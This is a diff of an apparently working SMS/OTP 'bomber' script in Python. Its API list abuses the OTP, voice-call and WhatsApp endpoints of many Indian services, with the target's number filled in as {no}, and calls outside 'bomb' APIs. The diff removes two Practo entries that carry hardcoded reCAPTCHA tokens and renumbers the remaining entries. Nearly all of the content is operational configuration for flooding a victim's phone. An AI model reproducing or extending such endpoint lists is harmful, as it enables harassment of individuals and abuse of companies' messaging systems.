@@ -401,7 +401,7 @@ class SqliteStorage:
 
 db = None
 
-# ========== COMPLETE API LIST (120 APIs) ==========
+# ========== COMPLETE API LIST (118 APIs - Practo Removed) ==========
 def build_api_list():
     apis = []
     
@@ -1980,37 +1980,7 @@ def build_api_list():
         "body": {"phone": "{no}"}
     })
     
-    # ====== 99. Practo SMS ======
-    apis.append({
-        "name": "Practo_SMS",
-        "url": "https://accounts.practo.com/phone_number_resend_otp",
-        "method": "POST",
-        "headers": {
-            "X-NewRelic-ID": "UAcFWVRADQsIXFNU",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Accept": "application/json, text/javascript, */*; q=0.01",
-            "X-Requested-With": "XMLHttpRequest",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": "mobile=%2B91{no}&g-recaptcha-response=0cAFcWeA4LKhUNc1gFczOyhgZzq9mCm7tT7I-FQllZbY_jv2epFHGRn5t_Z1rBhKQRZq5SDZvI5gxLruglRfjZTIlvT0HeaQ-Yg7Mw2Gy3w6QdAOlKH-AGGSTDMMSadAHftEg1K868hurF8Eqm71JVDaAH3XgpNeRRAMdpQrQvXS9dWyoQhfXu1Hr7iHUNnc7aPS4rZS6UMx24YaxhiFEQA7OId4nmpc08mq7zGhFRkFxYrE4mhHwBRLLdb49nu5pwEUBhRlgD_TljqOWoDUsZqcr4kPPppV_9CbmN6ntLt-jh11PTK1UcF1vPE2kyIp6H9VBQu3rhG9gqMiuc8TjAwntB1iHxOP01Rv1GkxncolCpgpreGlti__DT-rjKhgWvn6l5lMSU-a2n79V1wxY1_AdRWZ6HDK9oFWhLkRX7YzQB5dI0NJKLGF8tZDDTUQY2q9d840wph-1BRQoL3sv_o2f7wur1gmNQkPhuQlw2aJPX-hTPAS2sq5JyYKe4nTPYxwupnHxCfhw8OqFtriazRHut_9bKUEW5vu7SZgybmQE1Olfq9AL_OJb61kHW73pR5bkdJc61y2MNWcNdj8bcejzv_H_YizRDM6IKpYaWu4iHZOWiG6ePVQdjSJ6TScW3C1OS2dTllVWTx4nG4MAxxM31-1fsIqkgBM1y-LnttHVDxEWOFGgfrDlghyUa_VfC7hNDlk1LTOw1YEamQZ-c1gNIoMs-POo0Dmc853CZ_CsVcOd3klBksWJD8hc8JdaljbJbQUwHFYyGS2xkn66trJaSyWqdf8FytpePaG-J9Y0GsX09UXKK8M3FVAOp4EDpkYQbYArgAXgbZCJBem2Gfq3oSmkbwyH4yPUbK300Efozof6AzzvztS80kwlN-FaxLA5H3yxsYAhOiAit-HKInj_TIxKyGGC8eM8MY75roZ7CKtSm37ohvdz6GsGQrsZUHxVlmVmDx6jcKdDaap8Xn7LkUj2ZbYFkIZzCv4qoNzPelhSwqBFcwATI0x_RiKDxzz1PozfvKW77eBUYZs8QpZNEneBA9pg-jQtWR4lNoghy49nRiq_npCKuGxRkdt7gCQZj0Nr2mfjjimfYZdDOFQ-CAb56WiOOFFefmYdZML53Zak59pZLZxAcR2GSbPRUsTCUdFSRf9bNgyRUwGgj2yt3yposwawV3xmQaqPhQYJ0Lan83roYDr4YmucZlKriyljsv-xjR4bJFgOjO9Jx1Q8fzd4tyfcgFq7JUQ8fXZFMqCvMBEOqsfE"}
-    })
-    
-    # ====== 100. Practo Voice ======
-    apis.append({
-        "name": "Practo_Voice",
-        "url": "https://accounts.practo.com/send_voice_otp",
-        "method": "POST",
-        "headers": {
-            "X-NewRelic-ID": "UAcFWVRADQsIXFNU",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Accept": "application/json, text/javascript, */*; q=0.01",
-            "X-Requested-With": "XMLHttpRequest",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-        },
-        "body": "mobile=%2B91{no}&g-recaptcha-response=0cAFcWeA4UvhfXOC4zOYWpUqagDOdtUGvLowCjT3xxZsRHnLIyMQ_VFu27OKB_3tQXfarDvDWhGYtcwLll2sQ1gDxOiHtosPK8DxrG8Ik1XmjsM-CUz-q5DoH8SGbVsYK2tlmJuOSC3k2J_ftOHxsYqTSm75opTJbAVuueFRolX10ux9nyn3QETF8Sy2czMK-pyhwDSEWJuH1woL-onjPtE3OM-mS99RDkxYthJZUQ_ZNClfX0QH88RSSgA_x49CqQLA3S47HZMHq-DRvuvC81KIixxfsoDNTzCtbFQHjT4KWgKAQuyXjIB6QJeWoLmYlpvjRpJ3JzafZjhPRXlnmjOpjVbHkKXf9nQ-RyWepZMBroDNv84IFdk9djy_lAPDT1uVP95ObGUcyjMz60nipeO8X0kKAPT5uCPt4getcKulOdh1a8YAzF-vYfjdBG_K1PQ6r060J_aZHXU8_nS9PVpDnfanxtBbi60tk1gv_y52ED4Mj3ZB7Eum9gDXZYAT97xwTp9UR1Vy5dsFCclsqTsINQBH_y5yZJ3xqhOn0asokTmfuzLGxBRFVWC0gGpgXPiLp5LI7oF5GgK1B1zYv0LJR0S2EQAd7HcNPEp5WegheWmIYRrLQTRVxi52HjhOut7uBseq_lCOY_ObU2k-DcK6khpmBItyD3a5oc-nao-sHrE-SABRSrWPzDwbuU3oEwwXziebATwIP951QbUaoMEJv-j6MM7cVEasQQowdnLVF_g6v3Gc4pP6rtmXCW2XMgTF8D01iKOc2uU_t8f7P1Ws5az2P3o6LpZKHRwMEzsMWB-_b5q5KMs61xEcjMhMmURJ2Ba_4oTkPrWU5DVUaFbWdEatf_cVbhG_1pPpcnZtsVJNHrSdSQCgcX8MFcIoVbU5S7qDZbgTc86bjHnFCmnHnYeViWaIvuut3ugu3BN8lVHZco92i6wzMfSIlsYSGf9e9j_2jBbuSsx4KK-FeTwR06i1W0MH5mW9lsZqnxhEDwW1UflUt-tVLAmTXItEpN4nZOJDShMwIfQhDWBL4IQ9ADfPQywpVdXreT7iS80kVm8QO0asWUIrUNg0EkzAbE-aIft878ogK6BbPmYpFWjROBv1CMLAdXigefvq-1t-vGE0jx6KooyGdOeIBiHMx8Ex9RGTkkTe99Oz38b9Wh3lQaOOaAosDsuSHyUKMSFOffc9axpI04SQb1oKSNj7sUw4KQoToWAWtUj4JHJPbl3bZ_HMoe6juZCzKHK1BcUVxCpxNbS3bFEhk"}
-    })
-    
-    # ====== 101. MyAstro ======
+    # ====== 99. MyAstro ======
     apis.append({
         "name": "MyAstro",
         "url": "https://myastro.org.in/sendOtpPinnacle",
@@ -2024,7 +1994,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ====== 102. Holidayify ======
+    # ====== 100. Holidayify ======
     apis.append({
         "name": "Holidify",
         "url": "https://www.holidify.com/rest/package/submitCallme.hdfy",
@@ -2038,7 +2008,7 @@ def build_api_list():
         "body": "name=Adesh+Dubey&emailId=&contact={no}&country=88&internalPlaceCode=SINGAPORE&leadData=Destination.Packages_callMe_Packages_callMe_timeout_null&destCountryCode=SINGAPORE&countryPhoneCode=%2B91&platform=Linux+armv81&pageUrl=https%3A%2F%2Fwww.holidify.com%2Fplaces%2Fsingapore%2Fpackages.html%3Futm_source%3Dgoogle%26utm_medium%3Dpmax%26utm_campaign%3Dsingapore_pmax%26gad_source%3D1%26gad_campaignid%3D22725252908%26gbraid%3D0AAAAADLSud5aKXKVA0SLBfyeMwzh-26x4%26gclid%3DCjwKCAjwhNbTBhB4EiwAsFSg-ujhXN2fE1UAkJu948NZbf1V-KUlrFaPr828QQdKS4xxMk_MMZqB1RoCCEAQAvD_BwE&placeName=Singapore&referrer=https%3A%2F%2Fwww.google.com%2F&utmSource=google&utmMedium=pmax&utmCampaign=singapore_pmax&tourPackageIds=&quoteId=0&agentId=0&otpRequired=1&activeTourPackage=0"}
     })
     
-    # ====== 103. Jio ======
+    # ====== 101. Jio ======
     apis.append({
         "name": "Jio",
         "url": "https://www.jio.com/api/jio-login-service/login/sendOtp",
@@ -2050,7 +2020,7 @@ def build_api_list():
         "body": {"mobileNumber": "{no}", "loginFlowType": "MOBILE", "alternateNumber": ""}
     })
     
-    # ====== 104. KPN WhatsApp ======
+    # ====== 102. KPN WhatsApp ======
     apis.append({
         "name": "KPN_WhatsApp",
         "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
@@ -2064,7 +2034,7 @@ def build_api_list():
         "body": {"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": "{no}"}}
     })
     
-    # ====== 105. Wakefit SMS ======
+    # ====== 103. Wakefit SMS ======
     apis.append({
         "name": "Wakefit_SMS",
         "url": "https://api.wakefit.co/api/consumer-sms-otp/",
@@ -2076,7 +2046,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ====== 106. Byjus SMS ======
+    # ====== 104. Byjus SMS ======
     apis.append({
         "name": "Byjus_SMS",
         "url": "https://api.byjus.com/v2/otp/send",
@@ -2088,7 +2058,7 @@ def build_api_list():
         "body": {"phone": "{no}"}
     })
     
-    # ====== 107. Hungama OTP ======
+    # ====== 105. Hungama OTP ======
     apis.append({
         "name": "Hungama_OTP",
         "url": "https://communication.api.hungama.com/v1/communication/otp",
@@ -2100,7 +2070,7 @@ def build_api_list():
         "body": {"mobileNo": "{no}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"}
     })
     
-    # ====== 108. Meru Cab ======
+    # ====== 106. Meru Cab ======
     apis.append({
         "name": "MeruCab",
         "url": "https://merucabapp.com/api/otp/generate",
@@ -2112,7 +2082,7 @@ def build_api_list():
         "body": "mobile_number={no}"
     })
     
-    # ====== 109. ShipRocket ======
+    # ====== 107. ShipRocket ======
     apis.append({
         "name": "ShipRocket",
         "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
@@ -2124,7 +2094,7 @@ def build_api_list():
         "body": {"mobileNumber": "{no}"}
     })
     
-    # ====== 110. GoKwik V3 ======
+    # ====== 108. GoKwik V3 ======
     apis.append({
         "name": "GoKwik_V3",
         "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
@@ -2136,7 +2106,7 @@ def build_api_list():
         "body": {"phone": "{no}", "country": "in"}
     })
     
-    # ====== 111. Droom ======
+    # ====== 109. Droom ======
     apis.append({
         "name": "Droom",
         "url": "https://api.droom.in/v2/user/send-otp",
@@ -2148,7 +2118,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ====== 112. CarDekho ======
+    # ====== 110. CarDekho ======
     apis.append({
         "name": "CarDekho",
         "url": "https://api.cardekho.com/v1/user/send-otp",
@@ -2160,7 +2130,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ====== 113. Gaadi ======
+    # ====== 111. Gaadi ======
     apis.append({
         "name": "Gaadi",
         "url": "https://api.gaadi.com/v1/user/send-otp",
@@ -2172,7 +2142,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ====== 114. BikeDekho ======
+    # ====== 112. BikeDekho ======
     apis.append({
         "name": "BikeDekho",
         "url": "https://api.bikedekho.com/v1/user/send-otp",
@@ -2184,7 +2154,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ====== 115. OLX SMS ======
+    # ====== 113. OLX SMS ======
     apis.append({
         "name": "OLX_SMS",
         "url": "https://www.olx.in/api/auth/authenticate",
@@ -2200,7 +2170,7 @@ def build_api_list():
         "body": {"method": "sms", "phone": "{no}", "language": "en-IN", "grantType": "retry"}
     })
     
-    # ====== 116. RK Niloy Call API ======
+    # ====== 114. RK Niloy Call API ======
     apis.append({
         "name": "RK_Niloy_Call",
         "url": "https://rk-niloy-call-api-sigma.vercel.app/api",
@@ -2213,7 +2183,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ====== 117. RK Niloy Bomb API ======
+    # ====== 115. RK Niloy Bomb API ======
     apis.append({
         "name": "RK_Niloy_Bomb",
         "url": "https://rkniloycall.vercel.app/bomb/{no}",
@@ -2225,7 +2195,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ====== 118. OTP Bomber API ======
+    # ====== 116. OTP Bomber API ======
     apis.append({
         "name": "OTP_Bomber_API",
         "url": "https://otp-bomber-api.vercel.app/api",
@@ -2238,7 +2208,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ====== 119. BomberQ API ======
+    # ====== 117. BomberQ API ======
     apis.append({
         "name": "BomberQ_API",
         "url": "https://bomberqapis.vercel.app/bomb",
@@ -2251,7 +2221,7 @@ def build_api_list():
         "body": {}
     })
     
-    # ====== 120. IGP Earning API ======
+    # ====== 118. IGP Earning API ======
     apis.append({
         "name": "IGP_Earning",
         "url": "https://earning-igp.unaux.com//codes/89EzVmsnYb.php",
@@ -2277,7 +2247,7 @@ def build_api_list():
 
 # ========== BUILD APIS ==========
 APIS = build_api_list()
-logger.info(f"✅ Total APIs Loaded: {len(APIS)}")  # Output: 120
+logger.info(f"✅ Total APIs Loaded: {len(APIS)}")  # Output: 118
 
 # ========== DATABASE WRAPPER ==========
 class DatabaseWrapper:
